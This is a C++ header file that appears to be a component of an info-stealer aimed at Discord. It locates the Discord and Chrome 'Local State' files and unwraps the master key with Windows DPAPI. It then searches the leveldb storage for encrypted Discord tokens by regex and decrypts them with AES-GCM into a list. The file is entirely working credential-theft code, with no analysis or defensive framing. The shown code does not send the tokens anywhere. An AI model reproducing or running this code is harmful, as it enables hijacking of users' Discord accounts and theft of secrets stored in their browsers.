#pragma once

#include "utils/utils.hpp"
#include <filesystem>

namespace DiscordToken {

    struct user_data {
        std::string action_url;
        std::string username_value;
        std::string password_value;
    };

    bool WindowsUnprotect(const std::string &in, std::string &out) {

        DATA_BLOB encryptedBlob;
        DATA_BLOB plaintextBlob;

        encryptedBlob.pbData = reinterpret_cast<BYTE *>(const_cast<char *>(in.data()));
        encryptedBlob.cbData = static_cast<DWORD>(in.size());

        bool success = CryptUnprotectData(&encryptedBlob, NULL, NULL, NULL, NULL, 0, &plaintextBlob);

        if (success) {
            out.assign(reinterpret_cast<char *>(plaintextBlob.pbData), plaintextBlob.cbData);
            LocalFree(plaintextBlob.pbData);
        }

        return success;
    }

    bool Masterkey(const std::string &path, std::string &out) {

        std::string full_path = path + std::string("\\Local State");

        std::string file_content;
        fileIO::read_file(full_path, file_content);
        utils::conversion::utf8_encode(file_content);

        std::vector<std::string> match_vector;
        utils::string::match_regex(file_content, "\"encrypted_key\":\"([^\"]+)\"", match_vector);

        std::string encrypted_key = match_vector[0];

        std::string decoded64key;
        base64::decode(encrypted_key, decoded64key);
        decoded64key.erase(0, 5);

        return WindowsUnprotect(decoded64key, out);
    }

    bool TrimCipher(const std::string &original_data, std::string &out_pass, std::string &out_tag, std::string &iv) {
        if (original_data.size() < 15) {
            return false;
        }
        iv = original_data.substr(3, 12);
        if (original_data.size() < 15 + iv.size()) {
            return false;
        }
        std::string buf = original_data.substr(15);

        if (buf.size() < 16) {
            return false;
        }
        out_tag = buf.substr(buf.size() - 16);
        out_pass = buf.substr(0, buf.size() - 16);

        return true;
    }

    bool decrypt(const std::string &buff, const std::string &master_key, std::string &out) {
        if (master_key.empty()) {
            return false;
        }

        std::string iv_s, out_pass, out_tag;
        if (!TrimCipher(buff, out_pass, out_tag, iv_s)) {
            return false;
        }

        std::vector<unsigned char> key;
        utils::conversion::string_to_byte_vector(master_key, key);

        std::vector<unsigned char> ciphertext;
        utils::conversion::string_to_byte_vector(out_pass, ciphertext);

        std::vector<unsigned char> tag;
        utils::conversion::string_to_byte_vector(out_tag, tag);

        std::vector<unsigned char> iv;
        utils::conversion::string_to_byte_vector(iv_s, iv);

        int ciphertext_len = out_pass.size();
        std::vector<unsigned char> plaintext(ciphertext_len + 1);

        int plaintext_len = utils::crypt::aes_dec_gcm(ciphertext.data(), ciphertext_len, tag.data(), key.data(), iv.data(), iv.size(), plaintext.data());

        if (plaintext_len < 0) {
            return false;
        }

        out = std::string(reinterpret_cast<char *>(plaintext.data()), plaintext_len);
        return true;
    }

    void Collect(std::vector<std::string> &token_list) {

        std::string appdata_ = getenv("APPDATA");
        std::string appdata_local_ = getenv("LOCALAPPDATA");

        std::vector<std::string> path_list;
        path_list.push_back(appdata_ + "\\discord");
        path_list.push_back(appdata_local_ + "\\Google\\Chrome\\User Data");

        for (std::string path : path_list) {

            std::string key;
            Masterkey(path, key);

            utils::string::trim_str(key);

            std::string data_path = path + std::string("\\Local Storage\\leveldb");

            if (!fileIO::file_exists(data_path)) {
                data_path = path + std::string("\\Default\\Local Storage\\leveldb");
                if (!fileIO::file_exists(data_path)) {
                    continue;
                }
            }

            std::vector<std::string> encrypted_token_list;

            for (const std::filesystem::directory_entry &entry : std::filesystem::directory_iterator(data_path)) {
                if (entry.is_regular_file()) {
                    if (fileIO::has_extension(entry.path(), ".ldb") || fileIO::has_extension(entry.path(), ".log")) {

                        std::string content;
                        fileIO::read_utf8_file(entry.path().string(), content);

                        std::vector<std::regex> regex_list;
                        regex_list.push_back(std::regex(R"(dQw4w9WgXcQ:[^\"\[\]\(\)]*)"));
                        regex_list.push_back(std::regex(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)"));
                        regex_list.push_back(std::regex("dQw4w9WgXcQ:(.*?)="));

                        for (std::regex r : regex_list) {

                            std::sregex_iterator begin(content.begin(), content.end(), r);
                            std::sregex_iterator end;

                            for (std::sregex_iterator it = begin; it != end; ++it) {
                                std::smatch match = *it;
                                encrypted_token_list.push_back(match.str());
                            }
                        }
                    }
                }
            }

            for (const std::string &raw_token : encrypted_token_list) {

                if (raw_token.length() <= 12) {
                    continue;
                }

                std::string trimmed_token = raw_token.substr(12);

                std::string token_frombase64;
                base64::decode(trimmed_token, token_frombase64);

                std::string decrypted_token;
                decrypt(token_frombase64, key, decrypted_token);

                token_list.push_back(decrypted_token);
            }
        }
    }

}